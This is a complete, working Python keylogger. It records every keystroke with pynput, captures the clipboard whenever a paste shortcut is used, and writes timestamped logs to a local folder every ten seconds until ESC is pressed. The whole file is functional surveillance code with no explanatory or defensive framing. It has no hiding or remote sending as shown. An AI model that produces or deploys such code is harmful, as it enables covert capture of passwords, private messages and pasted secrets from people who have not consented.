import os
import time
import logging
import pyperclip
import threading
from datetime import datetime
from pynput import keyboard
LOG_DIR = "keylogs"
LOG_INTERVAL = 10  # seconds between saving logs
ENABLE_CLIPBOARD_LOGGING = True
os.makedirs(LOG_DIR, exist_ok=True)
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_file = os.path.join(LOG_DIR, f"log_{timestamp}.txt")
logger = logging.getLogger("KeyLogger")
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler(log_file, encoding="utf-8")
handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
logger.addHandler(handler)
pressed_keys = set()
log_buffer = []
stop_flag = False
def flush_log():
    global log_buffer
    if log_buffer:
        for line in log_buffer:
            logger.info(line)
        log_buffer = []
def auto_flush():
    while not stop_flag:
        time.sleep(LOG_INTERVAL)
        flush_log()
def format_key(key):
    if hasattr(key, 'char') and key.char:
        return key.char
    return f"[{str(key).replace('Key.', '').upper()}]"
def log_clipboard():
    try:
        clip = pyperclip.paste()
        if clip.strip():
            log_buffer.append(f"[CLIPBOARD] {clip}")
    except Exception as e:
        log_buffer.append(f"[Clipboard access failed] {e}")
def on_press(key):
    key_str = format_key(key)
    log_buffer.append(key_str)
    pressed_keys.add(key)
    if ENABLE_CLIPBOARD_LOGGING:
        if (keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys) and key_str.lower() == 'v':
            log_clipboard()
        if keyboard.Key.shift in pressed_keys and key == keyboard.Key.insert:
            log_clipboard()
def on_release(key):
    global stop_flag
    if key in pressed_keys:
        pressed_keys.remove(key)
    if key == keyboard.Key.esc:
        log_buffer.append("[EXIT]")
        flush_log()
        logger.info("Keylogger stopped with ESC")
        stop_flag = True
        return False
def main():
    print("Keylogger started. Press ESC to stop.")
    print(f"Logging to: {log_file}")
    flush_thread = threading.Thread(target=auto_flush, daemon=True)
    flush_thread.start()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    flush_log()
    print("Keylogger stopped. Log saved.")
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_flag = True
        flush_log()
        logger.info("Keylogger stopped with KeyboardInterrupt")


